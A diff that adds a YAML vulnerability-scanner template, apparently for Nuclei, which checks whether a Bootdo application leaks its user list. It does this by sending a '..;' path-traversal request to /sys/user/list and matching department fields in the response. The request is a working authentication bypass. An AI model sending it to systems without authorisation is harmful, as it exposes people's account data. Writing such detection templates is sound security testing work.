@@ -1,0 +1,20 @@
+id: poc-yaml-bootdo-user-info-leak
+info:
+  name: Bootdo User Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/css/..;/sys/user/list?limit=100&offset=0&name=&depId="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "deptId"
+          - "deptName"
+        part: body
